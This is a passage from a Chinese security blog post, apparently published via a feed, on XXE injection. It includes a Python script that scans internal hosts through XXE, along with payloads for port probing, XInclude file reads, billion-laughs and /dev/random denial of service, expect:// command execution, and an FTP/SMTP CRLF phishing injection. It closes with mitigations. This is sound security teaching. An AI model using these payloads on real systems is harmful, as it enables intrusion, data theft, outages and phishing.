class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot;</span> + <span class="string">&#x27;&quot;&#x27;</span> + string + <span class="string">&#x27;&quot;&#x27;</span> + <span class="string">&quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;creds&gt;&amp;xxe;&lt;/creds&gt;&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># print xml</span></span><br><span class="line">    send_xml(xml)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_xml</span>(<span class="params">xml</span>):</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/xml&#x27;</span>&#125;</span><br><span class="line">    x = requests.post(<span class="string">&#x27;http://192.168.118.144/xxe.php&#x27;</span>, data=xml, headers=headers, timeout=<span class="number">5</span>).text</span><br><span class="line">    <span class="keyword">print</span> x</span><br><span class="line">    <span class="comment"># print base64.b64decode(x)</span></span><br><span class="line">    <span class="keyword">if</span> x <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        ip_arr.append(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">255</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = str(i)</span><br><span class="line">        ip = <span class="string">&#x27;192.168.118.&#x27;</span> + i</span><br><span class="line">        string = <span class="string">&#x27;php://filter/convert.base64-encode/resource=http://&#x27;</span> + ip + <span class="string">&#x27;/&#x27;</span></span><br><span class="line">        <span class="keyword">print</span> string</span><br><span class="line">        build_xml(string)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/2019-02-17_00001.png"></p><h2 id="4-http内网主机端口探测"><a href="#4-http内网主机端口探测" class="headerlink" title="4. http内网主机端口探测"></a>4. http内网主机端口探测</h2><p>关于端口探测，和主机探测是类似的意思，在确定主机IP后，固定IP，利用payload，循环修改端口，查看结果即可。通常情况下，可以根据响应时间/长度/响应数据，攻击者将可以判断该端口是否已被开启。</p><p>比如说，我们确定了一台主机，利用下面的payload，在测试环境下会报错，而且端口开放与未开放的报错不一样，于是可以进行区分(80为开放端口，2333为未开放端口)：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">data</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;https://127.0.0.1:83/&quot;</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">data</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>  </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span>4<span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/2019-02-17_00003.png"></p><p><img src="https://i.loli.net/2019/02/18/5c69991fbd04e.png"></p><p>可以利用<code>burpsuite</code>或者写脚本，都可以很轻松的进行端口扫描，但是若想全部扫描，这个过程会比较耗时，也可以构建常用端口字典，进行部分扫描，提高效率。</p><p><img src="https://i.loli.net/2019/02/17/5c695e0ec66f7.png"></p><p><img src="https://i.loli.net/2019/02/17/5c695ecb3514c.png"></p><p><em>笔者测试发现不同的环境，结果可能会不一样，因此可能需要不同的payload进行端口扫描，这个需要具体结合代码和测试结果来敲定一个有效的payload。</em></p><h2 id="5-XInclude"><a href="#5-XInclude" class="headerlink" title="5. XInclude"></a>5. XInclude</h2><p>这个和<code>SchemaEntity</code>有关，可以看成是XML的扩展和继承，想了解更多可能要参考这个： <a href="http://www.w3school.com.cn/schema/schema_intro.asp">http://www.w3school.com.cn/schema/schema_intro.asp</a></p><p><strong>XML Schema：</strong>称为可扩展标记语言架构，用来定义 XML 文档的合法构建模块，类似 DTD，Schema是DTD的替代者, 它比DTD可以做更多的事情 。</p><p>include的href属性中可以进行文件读取，也可以使用协议进行SSRF。不过Xinclude需要手动开启，测试发现所有xml parser都默认关闭这一特性。</p><p><strong>示例代码</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">&quot;file:///home/rq/f123333333ag&quot;</span> <span class="attr">parse</span>=<span class="string">&quot;text&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">xi:include</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="6-其他攻击"><a href="#6-其他攻击" class="headerlink" title="6. 其他攻击"></a>6. 其他攻击</h2><h3 id="6-1-DDoS"><a href="#6-1-DDoS" class="headerlink" title="6.1 DDoS"></a>6.1 DDoS</h3><p><strong>示例代码</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line">  &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;&#x2F;lolz&gt;</span><br></pre></td></tr></table></figure><p>此测试可以在内存中将小型 XML 文档扩展到超过 3GB 而使服务器崩溃。<br>亦或者，如果目标是UNIX系统，</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">  &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">  &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;dev&#x2F;random&quot; &gt;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;&#x2F;foo&gt;</span><br></pre></td></tr></table></figure><p>如果 XML 解析器尝试使用 /dev/random 文件中的内容来替代实体，则此示例会使服务器（使用 UNIX 系统）崩溃。</p><h3 id="6-2-php-except模块下RCE"><a href="#6-2-php-except模块下RCE" class="headerlink" title="6.2 php except模块下RCE"></a>6.2 php except模块下RCE</h3><p>这种情况很少发生，但有些情况下攻击者能够通过XXE执行代码，这主要是由于配置不当/开发内部应用导致的。如果安装了这个expect 扩展我们就能直接利用 XXE 进行 RCE。</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE root[&lt;!ENTITY cmd SYSTEM &quot;expect:&#x2F;&#x2F;id&quot;&gt;]&gt;</span><br><span class="line">&lt;dir&gt;</span><br><span class="line">&lt;file&gt;&amp;cmd;&lt;&#x2F;file&gt;</span><br><span class="line">&lt;&#x2F;dir&gt;</span><br></pre></td></tr></table></figure><h3 id="6-3-钓鱼"><a href="#6-3-钓鱼" class="headerlink" title="6.3 钓鱼"></a>6.3 钓鱼</h3><p>如果内网有一台易受攻击的 SMTP 服务器，我们就能利用 ftp:// 协议结合 CRLF 注入向其发送任意命令，也就是可以指定其发送任意邮件给任意人，这样就伪造了信息源，造成钓鱼。以下内容摘自<a href="https://www.freebuf.com/articles/web/177979.html">https://www.freebuf.com/articles/web/177979.html</a></p><p>我们使用Java的XML解析器找到了一个易受攻击的端点。扫描内部端口后，我们发现了一个侦听在25端口的SMTP服务，Java支持在<code>sun.net.ftp.impl.FtpClient</code>中的ftp URI。因此，我们可以指定用户名和密码，例如<code>ftp://user:password@host:port/test.txt</code>，FTP客户端将在连接中发送相应的USER命令。</p><p>但是如果我们将%0D%0A (CRLF)添加到URL的user部分的任意位置，我们就可以终止USER命令并向FTP会话中注入一个新的命令，即允许我们向25端口发送任意的SMTP命令：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ftp:<span class="comment">//a%0D%0A</span></span><br><span class="line">EHLO%<span class="number">20</span>a%<span class="number">0</span>D%<span class="number">0</span>A</span><br><span class="line">MAIL%<span class="number">20</span>FROM%<span class="number">3</span>A%<span class="number">3</span>Csupport%<span class="number">40</span>VULNERABLESYSTEM.com%<span class="number">3</span>E%<span class="number">0</span>D%<span class="number">0</span>A</span><br><span class="line">RCPT%<span class="number">20</span>TO%<span class="number">3</span>A%<span class="number">3</span>Cvictim%<span class="number">40</span>gmail.com%<span class="number">3</span>E%<span class="number">0</span>D%<span class="number">0</span>A</span><br><span class="line">DATA%<span class="number">0</span>D%<span class="number">0</span>A</span><br><span class="line">From%<span class="number">3</span>A%<span class="number">20</span>support%<span class="number">40</span>VULNERABLESYSTEM.com%<span class="number">0</span>A</span><br><span class="line">To%<span class="number">3</span>A%<span class="number">20</span>victim%<span class="number">40</span>gmail.com%<span class="number">0</span>A</span><br><span class="line">Subject%<span class="number">3</span>A%<span class="number">20</span>test%<span class="number">0</span>A</span><br><span class="line">%<span class="number">0</span>A</span><br><span class="line">test!%<span class="number">0</span>A</span><br><span class="line">%<span class="number">0</span>D%<span class="number">0</span>A</span><br><span class="line">.%<span class="number">0</span>D%<span class="number">0</span>A</span><br><span class="line">QUIT%<span class="number">0</span>D%<span class="number">0</span>A</span><br><span class="line">:a@VULNERABLESYSTEM.com:<span class="number">25</span></span><br></pre></td></tr></table></figure><p>当FTP客户端使用此URL连接时，以下命令将会被发送给VULNERABLESYSTEM.com上的邮件服务器：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ftp:<span class="comment">//a</span></span><br><span class="line">EHLO a</span><br><span class="line">MAIL FROM: <span class="xml"><span class="tag">&lt;<span class="name">support@VULNERABLESYSTEM.com</span>&gt;</span></span></span><br><span class="line">RCPT TO: &lt;victim@gmail.com&gt;</span><br><span class="line">DATA</span><br><span class="line">From: support@VULNERABLESYSTEM.com</span><br><span class="line">To: victim@gmail.com</span><br><span class="line">Subject: Reset your password</span><br><span class="line">We need to confirm your identity. Confirm your password here: http://PHISHING_URL.com</span><br><span class="line">.</span><br><span class="line">QUIT</span><br><span class="line">:support@VULNERABLESYSTEM.com:25</span><br></pre></td></tr></table></figure><p>这意味着攻击者可以从从受信任的来源发送钓鱼邮件（例如：帐户重置链接）并绕过垃圾邮件过滤器的检测。除了链接之外，甚至我们也可以发送附件。</p><h1 id="XXE的防护"><a href="#XXE的防护" class="headerlink" title="XXE的防护"></a>XXE的防护</h1><p>在介绍成因的时候说过，<strong>会发生XXE 主要是因为<code>parser</code> 没有禁止使用外部实体</strong>，所以防护方法就是<strong>使用语言中推荐的禁用外部实体的方法</strong>。</p><p><strong>PHP：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure><p><strong>Java:</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DocumentBuilderFactory dbf &#x3D;DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line"></span><br><span class="line">.setFeature(&quot;http:&#x2F;&#x2F;apache.org&#x2F;xml&#x2F;features&#x2F;disallow-doctype-decl&quot;,true);</span><br><span class="line"></span><br><span class="line">.setFeature(&quot;http:&#x2F;&#x2F;xml.org&#x2F;sax&#x2F;features&#x2F;external-general-entities&quot;,false)</span><br><span class="line"></span><br><span class="line">.setFeature(&quot;http:&#x2F;&#x2F;xml.org&#x2F;sax&#x2F;features&#x2F;external-parameter-entities&quot;,false);</span><br></pre></td></tr></table></figure><p><strong>Python：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from lxml import etree</span><br><span class="line">xmlData &#x3D; etree.parse(xmlSource,etree.XMLParser(resolve_entities&#x3D;False))</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>XXE作为2017最新发布的<code>OWASP TOP10</code>的漏洞，其广泛性和危害性不言而喻。其攻击手段也是多种多样，在和其他漏洞结合之后，可以产生惊人的效果。笔者对XXE做了很多的复现和研究，得到的一些感悟和收获。之后可能还会对扩展性的xml_Schema以及与其他漏洞的结合做进一步的深入学习研究。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://xz.aliyun.com/t/3357">K0rz3n——一篇文章带你深入理解漏洞之 XXE 漏洞</a></li><li><a href="http://www.w3school.com.cn/x.asp">W3School的XML系列教程</a></li><li><a href="https://www.cnblogs.com/likwo/archive/2011/08/24/2151793.html">XML文档解析的几种方式</a></li><li><a href="https://www.freebuf.com/column/156863.html">freebuf——XXE学习之路-STEP BY STEP</a></li><li><a href="https://www.freebuf.com/articles/web/177979.htm">freebuf——XXE漏洞利用技巧：从XML到远程代码执行</a></li><li>[DTD/XXE 攻击笔记分享](DTD/XXE 攻击笔记分享)</li><li><a href="https://wooyun.js.org/drops/%E4%BD%A0%E6%89%80%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84XML%E5%AE%89%E5%85%A8.html">你所不知道的XML安全</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XXE是什么&quot;&gt;&lt;a href=&quot;#XXE是什么&quot; class=&quot;headerlink&quot; title=&quot;XXE是什么&quot;&gt;&lt;/a&gt;XXE是什么&lt;/h1&gt;&lt;p&gt;XXE(XML External Entity Injection) 全称为 XML 外部实体注入，这是一个</summary>
      
    
    
    
    <category term="Web安全" scheme="http://v0w.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="XXE" scheme="http://v0w.top/tags/XXE/"/>
    
  </entry>
  
</feed>
